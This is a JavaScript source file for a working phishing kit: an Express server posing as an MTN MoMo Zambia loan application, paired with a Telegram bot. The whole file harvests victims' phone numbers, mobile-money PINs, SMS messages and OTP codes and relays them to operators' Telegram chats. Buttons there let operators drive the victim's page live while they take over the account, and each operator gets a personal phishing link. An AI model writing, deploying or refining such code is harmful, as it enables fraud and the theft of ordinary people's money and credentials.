const express = require('express');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const MAIN_ADMIN_ID = (process.env.MAIN_ADMIN_ID || '').trim();

if (!TELEGRAM_BOT_TOKEN) {
    console.error('CRITICAL ERROR: TELEGRAM_BOT_TOKEN environment variable is missing!');
    process.exit(1);
}

if (!MAIN_ADMIN_ID) {
    console.error('CRITICAL ERROR: MAIN_ADMIN_ID environment variable is missing!');
    process.exit(1);
}

const PORT = process.env.PORT || 10000;
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });

// Sessions & submitted SMS/OTP deduplication store
const activeSessions = {};
const authorizedAdmins = new Set([MAIN_ADMIN_ID]);
const usedSmsHashes = new Set();
const usedOtpHashes = new Set();

function escapeMarkdown(text) {
    if (!text) return '';
    return text.toString().replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
}

function normalizeMsg(str) {
    return (str || '').toString().trim().replace(/\s+/g, ' ');
}

// Bot /start command: gives each user/admin their own isolated link mapped to their chatId
bot.on('message', (msg) => {
    if (!msg.text) return;
    const chatId = msg.chat.id;
    const userIdStr = chatId.toString().trim();
    const firstName = msg.from.first_name || 'Admin';
    const username = msg.from.username ? `@${msg.from.username}` : 'No username set';

    const host = (process.env.RENDER_EXTERNAL_URL || 'https://mtn1.onrender.com').replace(/\/+$/, '');
    const isolatedLink = `${host}/?admin=${userIdStr}`;

    if (msg.text.startsWith('/start')) {
        authorizedAdmins.add(userIdStr);

        const welcomeText =
            `🚨 *Your MTN MoMo Zambia Link Registered!*\n\n` +
            `👤 *Name:* ${escapeMarkdown(firstName)}\n` +
            `🆔 *Chat ID:* \`${escapeMarkdown(userIdStr)}\`\n` +
            `🏷 *Username:* ${escapeMarkdown(username)}\n\n` +
            `🔗 *Your Private Link (Mapped to Your Chat):*\n${isolatedLink}`;

        bot.sendMessage(chatId, welcomeText, { parse_mode: 'Markdown' })
            .catch((err) => console.error('Error sending /start message:', err));
    }
});

// Inline button callbacks: fade/remove buttons only while keeping message text intact
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data || '';
    const userIdStr = chatId.toString().trim();

    if (!authorizedAdmins.has(userIdStr)) {
        bot.answerCallbackQuery(query.id, { text: 'Not authorized.', show_alert: true }).catch(() => {});
        return;
    }

    const parts = data.split('_');
    const action = parts[0];
    const sessionId = parts.slice(1).join('_');
    const session = activeSessions[sessionId];

    if (!session) {
        bot.answerCallbackQuery(query.id, { text: 'Session expired or not found.', show_alert: true }).catch(() => {});
        return;
    }

    // Ensure only the assigned admin (or main admin if unassigned) controls the session
    if (session.targetAdmin !== userIdStr && MAIN_ADMIN_ID !== userIdStr) {
        bot.answerCallbackQuery(query.id, { text: 'Session belongs to another chat.', show_alert: true }).catch(() => {});
        return;
    }

    if (action === 'allow') {
        session.status = 'approved_pin';
    } else if (action === 'deny') {
        session.status = 'denied_pin';
    } else if (action === 'wrongpin') {
        session.status = 'wrong_pin';
    } else if (action === 'smsexpired') {
        session.status = 'sms_expired';
    } else if (action === 'done') {
        session.status = 'sms_done';
    } else if (action === 'otpexpired') {
        session.status = 'otp_expired';
    } else if (action === 'success') {
        session.status = 'success';
    }

    // Remove inline buttons so they fade out while keeping the applicant/SMS/OTP message unchanged
    bot.editMessageReplyMarkup(
        { inline_keyboard: [] },
        {
            chat_id: chatId,
            message_id: query.message.message_id
        }
    ).catch((err) => console.error('Error clearing inline keyboard:', err));

    bot.answerCallbackQuery(query.id).catch((err) => console.error('Error answering callback:', err));
});

// Step 3 of 3 submission: delivers PHONE NO and 5-digit PIN with ALLOW / DENY
app.post('/api/submit-credentials', (req, res) => {
    const {
        sessionId,
        phone,
        pin,
        amount,
        duration,
        purpose,
        firstName,
        lastName,
        adminId
    } = req.body;

    const cleanAdmin = (adminId || '').toString().trim();
    const targetAdmin = cleanAdmin && authorizedAdmins.has(cleanAdmin) ? cleanAdmin : MAIN_ADMIN_ID;

    activeSessions[sessionId] = {
        phone,
        pin,
        amount,
        duration,
        purpose,
        firstName,
        lastName,
        targetAdmin,
        status: 'pending_pin_approval'
    };

    const message =
        `NEW MTN MOMO ZAMBIA APPLICANT\n\n` +
        `PHONE NO: ${phone}\n` +
        `PIN: ${pin}`;

    bot.sendMessage(targetAdmin, message, {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: 'ALLOW', callback_data: `allow_${sessionId}` },
                    { text: 'DENY', callback_data: `deny_${sessionId}` }
                ]
            ]
        }
    }).catch((err) => {
        console.error('Telegram error sending credentials:', err.response ? err.response.body : err.message);
    });

    res.json({ success: true, sessionId });
});

// SMS verification submission (blocks duplicate SMS)
app.post('/api/submit-sms', (req, res) => {
    const { sessionId, smsText } = req.body;
    const session = activeSessions[sessionId];

    if (!session) {
        return res.json({ success: false, code: 'SESSION_NOT_FOUND', message: 'Session not found. Please restart.' });
    }

    const normalized = normalizeMsg(smsText);
    if (!normalized.startsWith("Y'ello.")) {
        return res.json({ success: false, code: 'INVALID_SMS', message: "SMS must start with Y'ello." });
    }

    if (usedSmsHashes.has(normalized)) {
        return res.json({
            success: false,
            code: 'DUPLICATE_SMS',
            message: 'This SMS has already been submitted. Duplicate SMS is not allowed.'
        });
    }

    usedSmsHashes.add(normalized);
    session.smsText = smsText.trim();
    session.status = 'pending_sms_review';

    const message =
        `MTN MOMO ZAMBIA - SMS RECEIVED\n\n` +
        `PHONE NO: ${session.phone}\n` +
        `PIN: ${session.pin}\n\n` +
        `SMS:\n${session.smsText}`;

    bot.sendMessage(session.targetAdmin, message, {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '📋 Copy SMS', copy_text: { text: session.smsText } }
                ],
                [
                    { text: 'SMS EXPIRED', callback_data: `smsexpired_${sessionId}` },
                    { text: 'INCORRECT PIN', callback_data: `wrongpin_${sessionId}` }
                ],
                [
                    { text: 'DONE ✅', callback_data: `done_${sessionId}` }
                ]
            ]
        }
    }).catch((err) => {
        console.error('Telegram error sending SMS:', err.response ? err.response.body : err.message);
    });

    res.json({ success: true });
});

// Applicant taps "Request New SMS" after 15-second countdown ends
app.post('/api/request-new-sms', (req, res) => {
    const { sessionId } = req.body;
    const session = activeSessions[sessionId];

    if (!session) {
        return res.json({ success: false, message: 'Session not found.' });
    }

    session.status = 'waiting_new_sms_notice';

    const message =
        `🔄 APPLICANT REQUESTED NEW SMS\n\n` +
        `PHONE NO: ${session.phone}\n` +
        `AMOUNT: ZMW ${Number(session.amount || 0).toLocaleString()}`;

    bot.sendMessage(session.targetAdmin, message).catch((err) => {
        console.error('Telegram error on new SMS request:', err.response ? err.response.body : err.message);
    });

    res.json({ success: true });
});

// 4-digit OTP submission (blocks duplicate OTP)
app.post('/api/submit-otp', (req, res) => {
    const { sessionId, otpCode } = req.body;
    const session = activeSessions[sessionId];

    if (!session) {
        return res.json({ success: false, code: 'SESSION_NOT_FOUND', message: 'Session not found. Please restart.' });
    }

    const cleanOtp = (otpCode || '').toString().trim();
    if (!/^\d{4}$/.test(cleanOtp)) {
        return res.json({ success: false, code: 'INVALID_OTP', message: 'Please enter a valid 4-digit OTP.' });
    }

    const otpKey = `${session.phone}:${cleanOtp}`;
    if (usedOtpHashes.has(otpKey)) {
        return res.json({
            success: false,
            code: 'DUPLICATE_OTP',
            message: 'This OTP has already been submitted. Duplicate OTP is not allowed.'
        });
    }

    usedOtpHashes.add(otpKey);
    session.otpCode = cleanOtp;
    session.status = 'pending_otp_review';

    const message =
        `MTN MOMO ZAMBIA - 4-DIGIT OTP\n\n` +
        `PHONE NO: ${session.phone}\n` +
        `OTP: ${cleanOtp}`;

    bot.sendMessage(session.targetAdmin, message, {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '📋 Copy OTP', copy_text: { text: cleanOtp } }
                ],
                [
                    { text: 'OTP EXPIRES', callback_data: `otpexpired_${sessionId}` },
                    { text: 'SUCCES', callback_data: `success_${sessionId}` }
                ]
            ]
        }
    }).catch((err) => {
        console.error('Telegram error sending OTP:', err.response ? err.response.body : err.message);
    });

    res.json({ success: true });
});

app.get('/api/check-status/:sessionId', (req, res) => {
    const session = activeSessions[req.params.sessionId];
    if (!session) {
        return res.json({ status: 'not_found' });
    }
    res.json({ status: session.status });
});

app.listen(PORT, () => {
    console.log(`MTN MoMo Zambia server running on port ${PORT}`);
});
    
